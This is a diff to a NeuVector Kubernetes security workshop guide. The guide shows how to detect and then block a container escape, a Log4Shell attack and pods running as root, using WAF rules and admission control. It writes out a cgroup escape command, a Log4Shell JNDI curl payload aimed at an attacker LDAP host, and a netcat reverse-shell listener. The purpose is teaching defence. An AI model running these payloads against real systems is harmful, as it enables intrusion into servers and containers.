@@ -329,8 +329,11 @@ First wait until all NeuVector Pods are up and running
     + •	Action: Deny
 3. Switch into **Protect** Mode
 4. Exit the terminal in the remote shell and try to trigger the c-group Event again
+```
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
 5. In NeuVector go to **Notification** -> **Security Event**
-## Remove unneeded processes
+## Investigate running processes
 1. Switch the Mode to **Protection** for the **sample-app** container
 2. **Remove** not needed **processes** from the **sample app container**
 3. Try to exectute the following command in the attacker terminal
@@ -349,18 +352,74 @@ sudo nc -lvnp 443
 ```
 6. Do the curl again:
 ```
-curl http://sample-app.default.3.79.57.125.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://3.68.166.70:1389/a}'
+curl http://sample-app.default.{VICTIM_PUPLIC_IP}.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://{ATTACKER_PUPLIC_IP}:1389/a}'
+```
+6. Look into  the notificaton
+## Now we will block the Log4Shell itself
+NeuVector's deep packet inspection also allow to scan and filter incoming and outgoing traffic with WAF (Web Application Firewall) and DLP (Data Loss Prevention) sensors.
+
+Go to **Policy > WAF Sensors** to see the already pre-configured sensors. Here you can also activate your own. You can find more information at [DLP & WAF Sensors](https://open-docs.neuvector.com/policy/dlp).
+
+To create a WAF rule that blocks the request from even reaching the sample-app
+
+* Go to **Policy > Groups** and choose the `nv.sample-app.default` group.
+* Go to the **WAF** tab
+* Click on the edit button
+* Choose the Log4Shell WAF sensor
+* Click apply
+* Set the WAF status toggle to **Enabled**
+* Run the following command on the victim VM again
+```
+curl http://sample-app.default.${VICTIM_PUPLIC_IP}.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://${ATTACKE_PUPLIC_IP}:1389/a}'
+```
+The request will be blocked. You can see a WAF alert under **Notifications > Security Events**.
+
+For further forensics, you can download a package capture PCAP file directly from the alert.
+
+## Show Admission Controll
+Next we want to prevent a Pod to be run as root to begin with.
+
+An admission controller in kubernetes is a small piece of software that will take the object being submitted to the API server and either allow it as-is, modify it, or block the resource from being added. In NeuVectors case, we want to block the deployment of workloads based on a set of security criteria.
+
+By default, this is disabled. To enable, navigate to **Policy -> Admission Control**, and click the **Status** toggle.
+
+Also make sure to switch the admission control to **Protect** mode.
+
+Let us create a rule that will block pods running as root in the `default` namespace. For more information on other available criteria, please see [Admission](https://open-docs.neuvector.com/policy/admission).
+
+Click **Add** and use the following settings:
+
+* Type: Deny
+* Comment: Deny root in default namespace
+
+Then add two criterion.
+
+First:
+
+* Criterion: Namespace
+* Operator: Is one of
+* Value: default
+
+Second:
+
+* Criterion: Run as root
+
+Note that you have to click the `+` icon for each criterion to actually add the rule that you configured in the form.
+
+Delete the Pod again to force Kubernetes to recreate it
+
+**Run the following commands on the victim VM.**
+
+```
+kubectl delete pod -n default -l app=sample-app
 ```
 
-6. Show the notificaton
-## Now we will block the Log4Shell itself
-1. Enable the WAF for the sample app
-2. Execute Curl show Notification and PCAP again
-## Show Admission Controll
-1. ** Policy ** -> ** Admission Control **
-2. Delete the sample-app pod
-3. Show Error Message in the ** Deployment** Section
-4. Going back to presentation
-5. Do a recap
+Kubernetes will now prevent the Pod creation. You can see this in the events of the Deployment's ReplicaSet:
+
+```
+kubectl describe replicaset
+```
+
+# Finish
 
 
